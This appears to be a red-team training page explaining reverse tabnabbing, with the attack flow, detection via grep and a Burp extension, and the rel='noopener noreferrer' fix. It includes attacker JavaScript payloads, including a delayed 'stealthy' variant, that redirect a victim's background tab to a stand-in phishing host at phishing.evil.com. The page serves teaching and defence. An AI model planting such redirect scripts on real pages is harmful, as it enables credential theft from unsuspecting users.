---
layout: training-page
title: "Tabnabbing — Red Team Academy"
module: "Web Hacking"
tags:
  - tabnabbing
  - reverse-tabnabbing
  - phishing
  - open-redirect
  - social-engineering
page_key: "web-tabnabbing"
render_with_liquid: false
---

# Tabnabbing

Tabnabbing (specifically **Reverse Tabnabbing**) is an attack where a page opened via a link from the target site — typically in a new browser tab — uses JavaScript to redirect the *original* background tab to a phishing site. Because users rarely check the URL of a background tab when they return to it, they may believe they have been logged out of the legitimate site and enter their credentials into the phishing page.

## Tools

- **Discovering Reverse Tabnabbing** — Burp Suite BApp extension that identifies vulnerable links — `portswigger.net/bappstore/80eb8fd46bf847b4b17861482c2f2a30`

## How It Works

When a browser opens a link with `target="_blank"`, the new tab gains a reference to the original tab's window object via `window.opener`. If the original page does not include `rel="noopener"` or `rel="noreferrer"`, the newly opened page can call `window.opener.location = "http://evil.com"` to navigate the original tab to an attacker-controlled URL.

Attack flow:

1. Attacker posts a link on the target site (forum post, user profile, comment) pointing to a site they control.
2. The link uses `target="_blank"` without `rel="noopener"`.
3. Victim clicks the link — it opens in a new tab.
4. The attacker's page runs: `window.opener.location = "http://evil-phishing-site.com"`
5. The original tab (background) is silently redirected to the phishing page.
6. Victim returns to the background tab, sees what appears to be a login page, and enters credentials.

## Attack Payload

The attacker's page must contain this JavaScript — executed when the victim opens the link:

```
<!-- Attacker's page: evil.com/index.html -->
<script>
  if (window.opener) {
    window.opener.location = "http://phishing.evil.com/login";
  }
</script>
```

More stealthy version — wait a few seconds before redirecting to reduce suspicion:

```
<script>
  setTimeout(function() {
    if (window.opener) {
      window.opener.location = "http://phishing.evil.com/login";
    }
  }, 3000);
</script>
```

## Identifying Vulnerable Links

Search the target application's HTML for links that open in a new tab without proper `rel` attributes:

```
<!-- Vulnerable -->
<a href="..." target="_blank" rel="">
<a href="..." target="_blank">

<!-- Safe -->
<a href="..." target="_blank" rel="noopener noreferrer">
```

Grep the application's source or crawled HTML for vulnerable patterns:

```
# Find all _blank links lacking noopener
grep -E 'target="_blank"' source.html | grep -v 'noopener'

# Using Burp Suite — install the "Discovering Reverse Tabnabbing" BApp
# It automatically flags vulnerable links during passive scanning
```

## Exploitation Conditions

For Reverse Tabnabbing to be exploitable, all of the following must be true:

- The target site allows user-submitted content that includes links (forums, comments, user profiles, wikis)
- The link uses `target="_blank"`
- The link does NOT include `rel="noopener"` or `rel="noreferrer"`
- The attacker controls the destination URL

## Modern Browser Behavior

As of 2021, all major browsers (Chrome, Firefox, Safari, Edge) apply `noopener` behavior by default for cross-origin links with `target="_blank"` — even without the explicit attribute. However, this does not apply to same-origin links, and older browser versions or certain configurations remain vulnerable. The explicit attribute is still required for complete protection across all environments.

## Fix

Add `rel="noopener noreferrer"` to all links that use `target="_blank"`:

```
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">External Link</a>
```

For dynamically generated links (e.g., user-submitted URLs), enforce this in the rendering layer — never rely on user input to include this attribute.

## Resources

- Reverse Tabnabbing — OWASP — owasp.org/www-community/attacks/Reverse_Tabnabbing
- Tabnabbing — Wikipedia
- Discovering Reverse Tabnabbing — PortSwigger BApp Store
